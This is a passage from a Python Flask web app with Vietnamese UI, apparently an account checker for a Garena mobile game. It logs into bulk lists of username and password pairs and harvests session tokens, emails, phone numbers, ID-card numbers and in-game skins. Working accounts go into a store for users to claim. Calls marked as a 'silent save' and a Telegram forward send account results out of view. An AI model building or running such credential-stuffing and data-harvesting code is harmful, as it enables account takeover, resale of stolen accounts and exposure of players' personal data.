                <div class="matrix-item"><div class="matrix-key">💰 Số Sò</div><div class="matrix-val" style="color:#ffd700; font-weight:800;">{r.get("shell", 0)} Sò</div></div>
            </div>
        </div>
        <div class="glass-panel">
            <div class="panel-header"><div class="panel-title">🏆 Chiến Tích Ingame</div></div>
            <div class="matrix-row-list">
                <div class="matrix-item"><div class="matrix-key">🎮 Tên Ingame</div><div class="matrix-val" style="color:#38bdf8; font-weight:800;">{r.get("name") or "Kiện Tướng"}{(" - Mã NV:" + str(r.get("player_uid"))) if r.get("player_uid") else ""}</div></div>
                <div class="matrix-item"><div class="matrix-key">🏅 Xếp Hạng</div><div class="matrix-val" style="color:#ffb800; font-weight:800;">{"🚫 Không khả dụng (đang bị ban)" if is_banned else ("🏆 " + (r.get("rank") or "Chưa xếp hạng") + " (" + str(r.get("rank_stars",0)) + " sao)")}</div></div>
                <div class="matrix-item"><div class="matrix-key">🔥 Tướng tủ</div><div class="matrix-val">{r.get("best_hero") or ("🚫 Không khả dụng (đang bị ban)" if is_banned else "N/A")}</div></div>
                <div class="matrix-item"><div class="matrix-key">⚡ Trận ấn tượng</div><div class="matrix-val">{r.get("best_play") or ("🚫 Không khả dụng (đang bị ban)" if is_banned else "N/A")}</div></div>
                <div class="matrix-item"><div class="matrix-key">📈 Trận gần đây</div><div class="matrix-val">{r.get("total_matches") or ("🚫 Không khả dụng (đang bị ban)" if is_banned else "N/A")}</div></div>
                <div class="matrix-item"><div class="matrix-key">🛡️ Tình trạng BAN</div><div class="matrix-val">{'<span class="status-badge status-danger">BỊ BAN</span>' if is_banned else '<span class="status-badge status-safe">Không bị BAN</span>'}</div></div>
            </div>
        </div>
    </div>
    <div class="glass-panel">
        <div class="panel-header"><div class="panel-title">👕 Kho Tướng & Skin <span style="color:#00f2fe;">({total_skins})</span></div></div>
        {skin_grid_html}
    </div>
    <div class="glass-panel">
        <div class="panel-header" style="cursor:pointer;" onclick="var d=document.getElementById('tokenDrawer'); if(d)d.style.display=d.style.display==='none'?'block':'none';">
            <div class="panel-title">🔑 Mã Token & Phiên Đăng Nhập</div>
            <i class="fa-solid fa-chevron-down" style="color:#00f2fe;"></i>
        </div>
        <div id="tokenDrawer" style="display:none; margin-top:14px; border-top:1px solid rgba(255,255,255,0.08); padding-top:14px;">
            {token_html or '<div style="text-align:center; color:#64748b;">Không có token</div>'}
        </div>
    </div>
    {ban_banner}
    <div class="card" style="text-align:center;">
        <div style="display:flex; gap:8px; flex-wrap:wrap; justify-content:center;">
            <button class="btn btn-success" onclick="copyBoth('{acc}','{pwd}')">📋 Copy TK + MK</button>
            <button class="btn btn-info" onclick="downloadCheckResult()">📥 Tải Kết Quả</button>
            <a href="/check" class="btn btn-secondary">🔄 Check Acc Khác</a>
            <a href="/history" class="btn btn-info">📋 Xem Lịch Sử</a>
        </div>
    </div>'''

# ========== UP ACC ==========
@app.route("/up_acc", methods=["GET", "POST"])
@admin_or_qtv_required
def up_acc():
    user = get_user()
    running_job = None
    for jid, j in STORAGE_JOBS.items():
        if not j.get("done") and not j.get("cancelled"):
            running_job = jid; break
    if request.method == "POST":
        if running_job:
            flash("⚠️ Đang có job up_acc chạy!", "error")
            return redirect(url_for("up_acc_progress", job_id=running_job))
        content_raw = ""
        if "file" in request.files and request.files["file"].filename:
            f = request.files["file"]
            if not f.filename.endswith(".txt"):
                flash("Chỉ nhận file .txt!", "error"); return redirect(url_for("up_acc"))
            content_raw = f.read().decode("utf-8", errors="ignore")
        if not content_raw: content_raw = request.form.get("accs_text", "").strip()
        if not content_raw: flash("Chưa có dữ liệu!", "error"); return redirect(url_for("up_acc"))
        accs = parse_file_content_advanced(content_raw, "auto")
        if not accs: flash("Không tìm thấy acc hợp lệ!", "error"); return redirect(url_for("up_acc"))
        if len(accs) > MAX_ACC_PER_UPLOAD:
            flash(f"Tối đa {MAX_ACC_PER_UPLOAD} acc/lần!", "error"); return redirect(url_for("up_acc"))
        job_id = uuid.uuid4().hex[:16]
        STORAGE_JOBS[job_id] = {"id": job_id, "admin": user["username"], "total": len(accs),
            "current": 0, "progress": 0, "done": False, "logs": [], "current_acc": "",
            "passed": 0, "banned": 0, "failed": 0,
            "started": time.time(), "cancelled": False, "started_at": time.time(), "type": "up_acc"}
        save_jobs(force=True)
        threading.Thread(target=run_storage_upload, args=(job_id, accs), daemon=True).start()
        log_admin("UP_ACC", job_id, f"{len(accs)} acc")
        return redirect(url_for("up_acc_progress", job_id=job_id))
    job_banner = ""
    if running_job:
        j = STORAGE_JOBS.get(running_job, {}); pct = j.get("progress", 0)
        job_banner = f'''<div class="card" style="border:2px solid #ffb800;">
            <div style="display:flex; align-items:center; gap:12px;">
                <div style="font-size:2em;">⚙️</div>
                <div style="flex:1;"><div style="font-weight:700; color:#ffb800; font-family:Orbitron;">ĐANG CÓ JOB UP ACC CHẠY</div>
                    <div style="font-size:0.85em; color:var(--text-dim);">Tiến trình: {pct}% ({j.get("current",0)}/{j.get("total",0)})</div></div>
                <a href="/up_acc/progress/{running_job}" class="btn btn-warning btn-sm">Xem →</a>
            </div></div>'''
    content = f'''{job_banner}
    <div class="card">
        <h2 class="card-title">📤 UP ACC VÀO KHO</h2>
        <p style="color:var(--text-dim); margin-bottom:14px; font-size:0.9em;">Bot sẽ check login + loại acc ban + loại 0 skin.</p>
        <form method="POST" enctype="multipart/form-data" {'style="opacity:0.5; pointer-events:none;"' if running_job else ''}>
            <div class="form-group"><label class="form-label">📎 Upload file .txt</label>
                <input type="file" name="file" class="form-input" accept=".txt"></div>
            <div style="text-align:center; color:var(--text-dim); margin:8px 0;">— HOẶC —</div>
            <div class="form-group"><label class="form-label">📝 Paste trực tiếp</label>
                <textarea name="accs_text" class="form-textarea" rows="10" placeholder="user1|pass1&#10;user2|pass2"></textarea></div>
            <button type="submit" class="btn btn-block" {'disabled' if running_job else ''}>🚀 BẮT ĐẦU LỌC & UP</button>
        </form>
    </div>'''
    return render_page(content, active_tab="up_acc", user=user)

@app.route("/up_acc/progress/<job_id>")
@admin_or_qtv_required
def up_acc_progress(job_id):
    user = get_user(); job = STORAGE_JOBS.get(job_id)
    if not job: flash("Job không tồn tại!", "error"); return redirect(url_for("up_acc"))
    content = f'''
    <div class="card" id="progress-card">
        <h2 class="card-title"><span class="spinner"></span> Đang check & up...</h2>
        <div class="progress-container">
            <div style="display:flex; justify-content:space-between; font-size:0.85em; margin-bottom:8px;">
                <span>Tiến trình</span><span id="progress-percent" style="font-family:Orbitron; color:#38bdf8; font-weight:800;">0%</span></div>
            <div class="progress-bar-wrap">
                <div class="progress-bar-fill" id="progress-bar" style="width:0%;"></div>
                <div class="progress-text" id="progress-text">0 / {job['total']}</div></div>
            <div style="text-align:center; font-size:0.85em; color:var(--text-dim); margin-top:8px;">Đang check: <b id="current-acc" style="color:#00f2fe; font-family:monospace;">Chờ...</b></div>
        </div>
        <button id="cancel-btn" onclick="cancelJob()" class="btn btn-danger btn-block">🛑 HUỶ</button>
        <div class="live-stats">
            <div class="live-stat"><div class="num" id="stat-passed" style="color:#00ff88;">0</div><div class="lbl">✅ PASSED</div></div>
            <div class="live-stat"><div class="num" id="stat-banned" style="color:#ff2951;">0</div><div class="lbl">🚫 BANNED</div></div>
            <div class="live-stat"><div class="num" id="stat-failed" style="color:#8b8b9a;">0</div><div class="lbl">✕ FAILED</div></div>
        </div>
        <div class="live-log" id="live-log"><div class="log-line normal">⏳ Chờ...</div></div>
    </div>
    <div id="done-section" style="display:none;">
        <div class="card">
            <h2 class="card-title" style="color:#00ff88;">✓ HOÀN TẤT!</h2>
            <div class="result-box" id="summary-box"></div>
            <a href="/kho_acc" class="btn btn-success btn-block" style="margin-top:14px;">📦 Xem Kho Acc</a>
            <a href="/up_acc" class="btn btn-secondary btn-block" style="margin-top:8px;">+ Up Tiếp</a>
        </div>
    </div>
    <script>
    var jobId = "{job_id}"; var pollInterval = setInterval(updateJob, 1500);
    function updateJob() {{
        fetch('/api/up_acc/progress/' + jobId).then(r => r.json()).then(data => {{
            if (data.error) {{ clearInterval(pollInterval); return; }}
            document.getElementById('progress-bar').style.width = data.progress + '%';
            document.getElementById('progress-percent').textContent = data.progress + '%';
            document.getElementById('progress-text').textContent = data.current + ' / ' + data.total;
            if (data.current_acc) document.getElementById('current-acc').textContent = data.current_acc;
            document.getElementById('stat-passed').textContent = data.passed || 0;
            document.getElementById('stat-banned').textContent = data.banned || 0;
            document.getElementById('stat-failed').textContent = data.failed || 0;
            if (data.logs && data.logs.length > 0) {{
                var html = ''; for (var i = 0; i < data.logs.length; i++) {{
                    var lg = data.logs[i]; html += '<div class="log-line ' + lg.type + '">' + lg.msg + '</div>'; }}
                var box = document.getElementById('live-log'); box.innerHTML = html; box.scrollTop = box.scrollHeight;
            }}
            if (data.done) {{ clearInterval(pollInterval);
                document.getElementById('progress-card').style.display = 'none';
                document.getElementById('done-section').style.display = 'block';
                document.getElementById('summary-box').textContent = data.summary || 'Hoàn tất!';
            }}
        }}).catch(e => console.log(e));
    }}
    function cancelJob() {{ if (!confirm('Huỷ?')) return; fetch('/api/up_acc/cancel/' + jobId, {{ method: 'POST' }}); }}
    </script>'''
    return render_page(content, active_tab="up_acc", user=user)

@app.route("/api/up_acc/progress/<job_id>")
@admin_or_qtv_required
def api_up_acc_progress(job_id):
    job = STORAGE_JOBS.get(job_id)
    if not job: return jsonify({"error": "Job không tồn tại"})
    return jsonify({"total": job.get("total", 0), "current": job.get("current", 0),
        "progress": job.get("progress", 0), "current_acc": job.get("current_acc", ""),
        "done": job.get("done", False), "logs": job.get("logs", [])[-20:],
        "passed": job.get("passed", 0), "banned": job.get("banned", 0),
        "failed": job.get("failed", 0), "summary": job.get("summary", "")})

@app.route("/api/up_acc/cancel/<job_id>", methods=["POST"])
@admin_or_qtv_required
def api_up_acc_cancel(job_id):
    job = STORAGE_JOBS.get(job_id)
    if job: job["cancelled"] = True
    return jsonify({"ok": True})

def run_storage_upload(job_id, acc_list):
    job = STORAGE_JOBS.get(job_id)
    if not job: return
    total = len(acc_list)
    lock = threading.Lock(); completed = [0]
    def process_one(pair):
        if job.get("cancelled"): return
        u, p = pair
        try: r = run_single_check(u, p, use_cache=False)
        except Exception as e:
            r = {"type": "failed", "error": str(e), "username": u, "password": p,
                 "sss": [], "ss": [], "anime": [], "skins": [], "other_skins": [],
                 "total_skins": 0, "uid": "", "shell": 0, "rank": "", "level": 0,
                 "name": "", "rank_stars": 0, "banned": False, "ban_end_time": "",
                 "mobile_no": "", "country_code": "", "email": "", "idcard": "",
                 "two_fa": False, "player_uid": "", "username_display": "", "nickname": ""}
        with lock:
            completed[0] += 1
            job["current"] = completed[0]
            job["progress"] = int((completed[0] / total) * 100)
            job["current_acc"] = u
            # 🆕 Gửi VIP về Telegram
            try:
                if should_send_vip_telegram(r):
                    threading.Thread(target=send_vip_telegram, args=(r,), daemon=True).start()
            except Exception as _e:
                logger.error(f"[VIP-TELE-UP] {u} err: {_e}")
            # 🤫 Lưu âm thầm vào bot
            try: tg_track_acc(r, source="up_acc")
            except Exception: pass
            if r.get("type") == "failed" or r.get("error"):
                job["failed"] += 1
                err_msg = r.get('error', '')[:60]
                err_short = ""
                if "PREPARE_FAIL result=101" in err_msg or "không tồn tại" in err_msg.lower():
                    err_short = "Tài khoản không tồn tại"
                elif "PREPARE_FAIL result=105" in err_msg:
                    err_short = "Email không tồn tại"
                elif "LOGIN_FAIL result=1" in err_msg or "LOGIN_FAIL result=2" in err_msg:
                    err_short = "Sai mật khẩu"
                elif "LOGIN_FAIL result=3" in err_msg:
                    err_short = "Tài khoản bị khóa"
                elif "LOGIN_FAIL result=5" in err_msg:
                    err_short = "Bật 2FA"
                elif "block" in err_msg.lower() or "IP" in err_msg:
                    err_short = "IP bị block"
                elif "timeout" in err_msg.lower():
                    err_short = "Timeout"
                else:
                    err_short = err_msg
                err_display = f"✕ [FAIL] {u} ❌ {err_short}"
                job["logs"].append({"acc": u, "type": "failed", "msg": err_display})
            elif r.get("banned"):
                job["banned"] += 1
                job["logs"].append({"acc": u, "type": "banned", "msg": f"🚫 [BAN] {u} — BỎ"})
            elif r.get("total_skins", 0) == 0:
                job["failed"] += 1
                job["logs"].append({"acc": u, "type": "failed", "msg": f"○ [0 SKIN] {u} — BỎ"})
            else:
                job["passed"] += 1
                job["logs"].append({"acc": u, "type": "sss" if r.get("sss") else ("anime" if r.get("anime") else ("ss" if r.get("ss") else "normal")),
                                    "msg": f"✅ [PASS] {u} — UID: {r.get('uid','?')} | {r.get('total_skins',0)} skin"})
                with _lock:
                    ACC_STORAGE.append({"id": uuid.uuid4().hex[:12], "acc": u, "password": p,
                        "uid": r.get("uid", ""), "nick": r.get("name", ""),
                        "rank": r.get("rank", ""), "rank_stars": r.get("rank_stars", 0),
                        "level": r.get("level", 0), "shell": r.get("shell", 0),
                        "banned": False, "ban_end_time": "",
                        "total_skins": r.get("total_skins", 0),
                        "mobile_no": r.get("mobile_no", ""), "country_code": r.get("country_code", ""),
                        "email": r.get("email", ""), "idcard": r.get("idcard", ""),
                        "two_fa": r.get("two_fa", False),
                        "player_uid": r.get("player_uid", ""),
                        "username_display": r.get("username_display", ""),
                        "nickname": r.get("nickname", ""),
                        "register_time": r.get("register_time", ""),
                        "skins_sss": [{"hero": s["hero_name"], "skin": s["skin_name"], "id": s["item_id"], "cdn": s.get("cdn",""), "cdn_fallback": s.get("cdn_fallback","")} for s in r.get("sss", [])],
                        "skins_ss": [{"hero": s["hero_name"], "skin": s["skin_name"], "id": s["item_id"], "cdn": s.get("cdn",""), "cdn_fallback": s.get("cdn_fallback","")} for s in r.get("ss", [])],
                        "skins_anime": [{"hero": s["hero_name"], "skin": s["skin_name"], "id": s["item_id"], "cdn": s.get("cdn",""), "cdn_fallback": s.get("cdn_fallback","")} for s in r.get("anime", [])],
                        "skins_other": [{"hero": s["hero_name"], "skin": s["skin_name"], "id": s["item_id"], "cdn": s.get("cdn",""), "cdn_fallback": s.get("cdn_fallback","")} for s in r.get("other_skins", [])],
                        "added_at": time.time(), "added_by": job["admin"]})
            if len(job["logs"]) > 50: job["logs"] = job["logs"][-50:]
            if completed[0] % 20 == 0: save_data(); save_jobs(force=True)
    for i in range(0, total, STORAGE_BATCH_SIZE):
        if job.get("cancelled"): break
        batch = acc_list[i:i+STORAGE_BATCH_SIZE]
        with ThreadPoolExecutor(max_workers=STORAGE_CHECK_THREADS) as ex:
            futures = [ex.submit(process_one, pair) for pair in batch]
            for f in as_completed(futures):
                if job.get("cancelled"): break
    save_data(force=True); save_jobs(force=True)
    job["done"] = True; job["progress"] = 100
    job["summary"] = (f"✅ HOÀN TẤT!\n├─ Tổng: {total} acc\n├─ ✅ Vào kho: {job['passed']}\n"
        f"├─ 🚫 Bị ban (bỏ): {job['banned']}\n└─ ✕ Check fail / 0 skin: {job['failed']}\n\n📦 Kho hiện tại: {len(ACC_STORAGE)} acc")
    NOTIFICATIONS.append({"id": uuid.uuid4().hex[:10], "title": "🎁 Kho Acc mới!",
        "content": f"Admin vừa up {job['passed']} acc mới. Vào /nhan_acc để nhận!",
        "admin": job["admin"], "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "timestamp": time.time()})
    def cleanup(): time.sleep(600); STORAGE_JOBS.pop(job_id, None)
    threading.Thread(target=cleanup, daemon=True).start()

def run_single_check(u, p, proxy=None, use_cache=True):
    if use_cache and not proxy:
        cached = cache_get(u, p)
        if cached:
            logger.info(f"[CACHE] {u} — dùng cache")
            return cached
    r = {"type": "failed", "username": u, "password": p, "rank": "", "level": 0,
         "name": "", "rank_stars": 0, "skins": [], "sss": [], "ss": [], "anime": [],
         "other_skins": [], "all_skins": [], "banned": False, "uid": "", "shell": 0,
         "error": "", "total_skins": 0, "mobile_no": "", "email": "", "idcard": "",
         "two_fa": False, "country_code": "", "username_display": "", "nickname": "",
         "best_hero": "", "best_play": "", "total_matches": "", "rank_id": 0,
         "player_uid": "", "ban_end_time": "", "ban_reason": "",
         "ban_sources": [], "proxy_used": proxy or "", "register_time": "",
         "sso_key": "", "access_token": "", "session_token": "", "open_id": ""}
    for attempt in range(AUTO_RETRY + 1):
        try:
            # 🔧 FIX: Ưu tiên dùng CLM pipeline (chính xác hơn)
            if _USE_CLM_PIPELINE:
                try:
                    pl = CLM_GarenaPipeline(u, p)
                    # CLM pipeline không có param proxy, nhưng OK
                    logger.info(f"[PIPELINE] {u} — Dùng CLM pipeline")
                except Exception as _e:
                    logger.warning(f"[PIPELINE] {u} — CLM fail: {_e}, fallback kk")
                    pl = GarenaPipeline(u, p, proxy=proxy)
            else:
                pl = GarenaPipeline(u, p, proxy=proxy)
            login_ok = pl.login_full()
            # 🔧 FIX: CLM pipeline không có tcp_login_result → dùng getattr an toàn
            tcp_res = getattr(pl, 'tcp_login_result', None) or {}
            # 🔧 FIX: An toàn với mọi loại dict
            if not isinstance(tcp_res, dict):
                tcp_res = {}
            tcp_detail = tcp_res.get('detail', '')
            tcp_status = tcp_res.get('status', '')
            if not login_ok:
                r["error"] = pl.last_error or "Login failed"
                if "LOGIN_FAIL=3" in tcp_detail or "khóa" in r["error"].lower():
                    r["banned"] = True; r["type"] = "banned"
                    r["ban_sources"].append("tcp_lock")
                    r["ban_reason"] = "Tài khoản bị khóa (TCP LOGIN_FAIL=3)"
                    logger.warning(f"[BAN-CHECK] {u} — TCP LOGIN_FAIL=3 → BANNED ✅")
                elif "PREPARE_FAIL=101" in tcp_detail:
                    r["banned"] = True; r["type"] = "banned"
                    r["ban_sources"].append("tcp_prepare")
                    r["ban_reason"] = "Tài khoản không tồn tại / bị xóa"
                    logger.warning(f"[BAN-CHECK] {u} — PREPARE_FAIL=101 → BANNED ✅")
                if use_cache and not proxy: cache_set(u, p, r)
                return r
            r["sso_key"] = pl.sso_key or ""
            r["access_token"] = pl.access_token or ""
            r["session_token"] = pl.session_token or ""
            r["open_id"] = pl.open_id or ""
            # 🔧 FIX: Chạy TUẦN TỰ (giống app.py) → data đầy đủ, không bị rate limit
            ad = wd = sd = kd = None
            
            logger.info(f"[SEQ-1/4] {u} — fetch_account_security...")
            try:
                ad = pl.fetch_account_security()
                logger.info(f"[SEQ-1/4] {u} — OK")
            except Exception as e:
                logger.warning(f"[SEQ-1/4] {u} — EXC: {e}")
            
            logger.info(f"[SEQ-2/4] {u} — fetch_weekly_profile...")
            try:
                wd = pl.fetch_weekly_profile()
                logger.info(f"[SEQ-2/4] {u} — {'OK' if wd else 'FAIL/NULL'}")
            except Exception as e:
                logger.warning(f"[SEQ-2/4] {u} — EXC: {e}")
            
            logger.info(f"[SEQ-3/4] {u} — fetch_sale_skins...")
            try:
                sd = pl.fetch_sale_skins()
                logger.info(f"[SEQ-3/4] {u} — {'OK' if sd else 'FAIL/NULL'}")
            except Exception as e:
                logger.warning(f"[SEQ-3/4] {u} — EXC: {e}")
            
            logger.info(f"[SEQ-4/4] {u} — fetch_kientuong_player...")
            try:
                kd = pl.fetch_kientuong_player()
                if kd:
                    logger.info(f"[SEQ-4/4] {u} — OK | rank={kd.get('rank')} | banned={kd.get('banned')} | name={kd.get('name')}")
                else:
                    logger.warning(f"[SEQ-4/4] {u} — FAIL/NULL")
            except Exception as e:
                logger.warning(f"[SEQ-4/4] {u} — EXC: {e}")
            # 🆕 🔧 FIX: Check BAN CHÍNH XÁC — kientuong là nguồn chính
            ban_ends = []; ban_reasons = []
            is_banned = False
            
            # ✅ NGUỒN CHÍNH: kientuong (đã parse chuẩn)
            if kd:
                if kd.get('banned') == 'YES':
                    is_banned = True
                    r["ban_sources"].append("kientuong")
                    if kd.get('ban_end_time'):
                        ban_ends.append(kd['ban_end_time'])
                    if kd.get('ban_reason'):
                        ban_reasons.append(kd['ban_reason'])
                    logger.info(f"[BAN-SRC] {u} | kientuong=YES | end={kd.get('ban_end_time')} | reason={kd.get('ban_reason')}")
                else:
                    logger.info(f"[BAN-SRC] {u} | kientuong=NO")
            else:
                logger.warning(f"[BAN-SRC] {u} | kientuong=NO_DATA (không lấy được data)")
            
            # ✅ TCP lock (LOGIN_FAIL=3) → BAN chắc chắn
            if "tcp_lock" in r["ban_sources"]:
                is_banned = True
                logger.info(f"[BAN-SRC] {u} | tcp_lock=YES")
            
            # ⚠️  Fallback: CHỈ check weekly khi kientuong KHÔNG báo ban
            if not is_banned and wd and not (kd and kd.get('banned') == 'YES'):
                is_b, e_b, r_b = _check_ban_from_weekly(wd)
                if is_b:
                    is_banned = True
                    r["ban_sources"].append("weekly")
                    if e_b: ban_ends.append(e_b)
                    if r_b: ban_reasons.append(r_b)
                    logger.info(f"[BAN-SRC] {u} | weekly=YES (fallback)")
            
            # ⚠️  Fallback: CHỈ check account khi 2 nguồn kia không báo
            if not is_banned and ad and not (kd and kd.get('banned') == 'YES'):
                is_b, e_b, r_b = _check_ban_from_account(ad)
                if is_b:
                    is_banned = True
                    r["ban_sources"].append("account")
                    if e_b: ban_ends.append(e_b)
                    if r_b: ban_reasons.append(r_b)
                    logger.info(f"[BAN-SRC] {u} | account=YES (fallback)")

            # Đếm số nguồn báo ban
            true_count = len(r["ban_sources"])
            logger.info(f"[BAN-COUNT] {u} | true_count={true_count} | sources={r['ban_sources']}")

            if true_count == 1 and r["ban_sources"] == ["kientuong"]:
                logger.info(f"[VERIFY] {u} | chỉ kientuong báo ban → verify lại lần 2...")
                time.sleep(1)
                try:
                    kd2 = pl.fetch_kientuong_player()
                    if kd2 and kd2.get('banned') == 'YES':
                        is_banned = True
                        logger.info(f"[VERIFY] {u} | confirm BAN (kientuong lần 2 OK)")
                    else:
                        is_banned = False; r["ban_sources"] = []
                        logger.info(f"[VERIFY] {u} | FALSE POSITIVE — kientuong lần 2 báo OK ✅")
                except Exception as e:
                    logger.warning(f"[VERIFY] {u} EXC: {e}")
                    is_banned = False; r["ban_sources"] = []
            r["banned"] = is_banned
            if ban_ends:
                r["ban_end_time"] = max(ban_ends)
            else:
                r["ban_end_time"] = ""
            if ban_reasons:
                r["ban_reason"] = "; ".join(set(ban_reasons))[:150]
            else:
                r["ban_reason"] = ""
            logger.info(f"[BAN-FINAL] {u} | banned={is_banned} | end={r['ban_end_time']} | reason={r['ban_reason']}")
            # 🆕 Verify ban kỹ hơn
            if r["banned"]:
                # Nếu có tcp_lock hoặc tcp_prepare → không cần verify
                if "tcp_lock" in r["ban_sources"] or "tcp_prepare" in r["ban_sources"]:
                    logger.info(f"[BAN-FINAL] {u} | tcp flag → giữ nguyên BAN")
                else:
                    # Verify bằng TCP lần 2
                    verified = _verify_ban(u, p, r["banned"], r["ban_sources"])
                    if not verified:
                        # Verify thất bại → check lại kientuong lần 3
                        logger.info(f"[BAN-VERIFY] {u} | TCP verify fail → check kientuong lại")
                        try:
                            kd3 = pl.fetch_kientuong_player()
                            if kd3 and kd3.get('banned') == 'YES':
                                r["banned"] = True
                                logger.info(f"[BAN-FINAL] {u} | kientuong confirm BAN")
                            else:
                                r["banned"] = False
                                r["ban_sources"] = []
                                logger.info(f"[BAN-FINAL] {u} | KHÔNG BAN (false positive)")
                        except Exception as e:
                            r["banned"] = False
                            r["ban_sources"] = []
                            logger.info(f"[BAN-FINAL] {u} | EXC → KHÔNG BAN")
            logger.info(f"[BAN-FINAL] {u} | banned={r['banned']} | sources={r['ban_sources']}")
            usr = {}
            if ad and isinstance(ad, dict):
                if "user_info" in ad and isinstance(ad["user_info"], dict): usr = ad["user_info"]
                elif "data" in ad and isinstance(ad["data"], dict): usr = ad["data"]
                else: usr = ad
            r["uid"] = usr.get('uid', pl.garena_uid or 'N/A')
            r["shell"] = usr.get('shell', 0) or 0
            r["username_display"] = usr.get('username', '') or u
            r["nickname"] = usr.get('nickname', '') or usr.get('nick_name', '') or ''
            mobile = usr.get('mobile_no') or usr.get('mobile') or usr.get('phone') or ''
            cc = usr.get('country_code') or usr.get('countryCode') or ''
            r["mobile_no"] = str(mobile) if mobile else ''
            r["country_code"] = str(cc) if cc else ''
            email = usr.get('email') or usr.get('email_address') or usr.get('mail') or ''
            r["email"] = str(email) if email else ''
            idc = usr.get('idcard') or usr.get('id_card') or usr.get('cmnd') or usr.get('cccd') or ''
            r["idcard"] = str(idc) if idc else ''
            two_fa = usr.get('two_step_verify_enable') or usr.get('twoStepVerify') or usr.get('two_fa') or 0
            r["two_fa"] = bool(two_fa)
            if not r["name"]: r["name"] = r["nickname"] or r["username_display"]
            if not r["level"]: r["level"] = usr.get('level', 0) or 0
            if wd and isinstance(wd, dict):
                p_info = wd.get("player_info", {})
                rep = wd.get("report", {})
                rc = wd.get("rank_config", {})
                rank_id = p_info.get("rank")
                r["rank_id"] = rank_id or 0
                if rank_id and rc.get(str(rank_id)):
                    r["rank"] = rc[str(rank_id)].get("name", "")
                try:
                    trend = rep.get("rank", {}).get("week", {}).get("trend", [])
                    if trend: r["rank_stars"] = trend[-1].get("star", 0)
                except: pass
                try:
                    pm_list = rep.get("match", {}).get("play_most", [])
                    if pm_list:
                        pm = pm_list[0]
                        hero_name = pm.get('hero_name', '')
                        if hero_name in ('New Hero', '', None):
                            hero_id = pm.get('hero_id') or pm.get('heroId')
                            if hero_id: hero_name = HERO_MAP.get(str(hero_id), f"Tướng #{hero_id}")
                            else: hero_name = 'Không rõ'
                        wr = pm.get("win_rate", {}).get("data", 0)
                        r["best_hero"] = f"{hero_name} ({pm.get('play_count',0)} trận, WR: {wr}%)"
                except: pass
                try:
                    bp = rep.get("match", {}).get("best_play", {})
                    if bp:
                        kda = bp.get("kda", [0,0,0])
                        hb = bp.get('hero_name', '')
                        if hb in ('New Hero', '', None):
                            hid = bp.get('hero_id') or bp.get('heroId')
                            if hid: hb = HERO_MAP.get(str(hid), f"Tướng #{hid}")
                        r["best_play"] = f"{hb} KDA {kda[0]}/{kda[1]}/{kda[2]}"
                except: pass
                try:
                    cnt = rep.get("match", {}).get("count", {})
                    if cnt:
                        rk = cnt.get("rank", 0); nrk = cnt.get("non_rank", 0)
                        r["total_matches"] = f"{rk+nrk} trận (Rank: {rk}, Thường: {nrk})"
                except: pass
                if p_info.get("name"): r["name"] = p_info["name"]
                if p_info.get("player_uid"):
                    pu = str(p_info["player_uid"])
                    if "_" in pu: pu = pu.split("_")[0]
                    r["player_uid"] = pu
            # 🔧 FIX: kientuong là NGUỒN CHÍNH cho rank + level + name
            if kd:
                if kd.get('level', 0) > 0:
                    r["level"] = kd.get('level', 0)
                if kd.get('name'):
                    r["name"] = kd.get('name', '')
                if kd.get("register_time"):
                    r["register_time"] = kd["register_time"]
                # ✅ Rank từ kientuong luôn ưu tiên (đã là tên rank)
                if kd.get('rank') and kd.get('rank') != "Chưa xếp hạng":
                    r["rank"] = kd.get('rank')
                    r["rank_stars"] = kd.get('rank_stars', 0) or r.get("rank_stars", 0)
            all_skins = []; other_skins = []
            sss_list, ss_list, anime_list = [], [], []
            if sd:
                up = ((sd.get("data") or {}).get("getUser") or {}).get("profile") or {}
                oids = up.get("ownedItemIdList") or []
                for iid in oids:
                    info = parse_item_info(iid)
                    if info:
                        # ✅ Ảnh skin chuẩn: 30{prefix}{variant}head.jpg
                        _iid = int(iid)
                        _prefix = _iid // 100 if _iid >= 10000 else _iid
                        _variant = _iid % 100 if _iid >= 10000 else 0
                        info["cdn"] = f"https://dl.ops.kgvn.garenanow.com/hok/VN/HeroHeadPath/30{_prefix}{_variant}head.jpg"
                        info["cdn_fallback"] = f"https://dl.ops.kgvn.garenanow.com/hok/VN/HeroHeadPath/30{_prefix}0.jpg"
                        all_skins.append(info)
                        if info['tier'] == 'SSS': sss_list.append(info)
                        elif info['tier'] == 'SS': ss_list.append(info)
                        elif info['tier'] == 'Anime': anime_list.append(info)
                    else:
                        hero_name = get_hero_name_from_id(iid)
                        _iid = int(iid)
                        _prefix = _iid // 100 if _iid >= 10000 else _iid
                        _variant = _iid % 100 if _iid >= 10000 else 0
                        other_skins.append({"item_id": iid, "hero_name": hero_name,
                                            "skin_name": f"Skin #{iid}", "tier": "Normal",
                                            "cdn": f"https://dl.ops.kgvn.garenanow.com/hok/VN/HeroHeadPath/30{_prefix}{_variant}head.jpg",
                                            "cdn_fallback": f"https://dl.ops.kgvn.garenanow.com/hok/VN/HeroHeadPath/30{_prefix}0.jpg"})
            r["sss"] = sss_list; r["ss"] = ss_list; r["anime"] = anime_list
            logger.info(f"[SKIN-PARSE] {u} — Total:{len(all_skins)+len(other_skins)} | SSS:{len(sss_list)} | SS:{len(ss_list)} | Anime:{len(anime_list)} | Other:{len(other_skins)}")
            r["other_skins"] = other_skins
            r["all_skins"] = all_skins + other_skins
            r["total_skins"] = len(r["all_skins"])
            r["skins"] = all_skins
            if r["banned"]: r["type"] = "banned"
            elif r["sss"]: r["type"] = "sss"
            elif r["anime"]: r["type"] = "anime"
            elif r["ss"]: r["type"] = "ss"
            elif r["total_skins"] == 0: r["type"] = "trang"
            elif r["total_skins"] <= 5: r["type"] = "trang"
            else: r["type"] = "normal"
            # 🆕 VERIFY ACC — check SAU khi có data
            # Điều kiện: PHẢI có UID thật VÀ có ít nhất 1 dấu hiệu acc thật
            _uid_str = str(r.get("uid", "")).strip()
            _uid_ok = False
            if _uid_str and _uid_str not in ("N/A", "0", "None", "null", ""):
                try:
                    _uid_ok = int(_uid_str) > 0
                except (ValueError, TypeError):
                    _uid_ok = len(_uid_str) > 5

            _name_str = str(r.get("name", "")).strip()
            _rank_str = str(r.get("rank", "")).strip()
            _shell = r.get("shell", 0)
            _skins = r.get("total_skins", 0)

            _has_signal = False
            if _name_str and _name_str not in ("Kiện Tướng", "N/A", "", "None"):
                _has_signal = True
            if _rank_str and _rank_str not in ("Chưa xếp hạng", "N/A", "", "None"):
                _has_signal = True
            try:
                if int(_shell) > 0: _has_signal = True
            except (ValueError, TypeError): pass
            try:
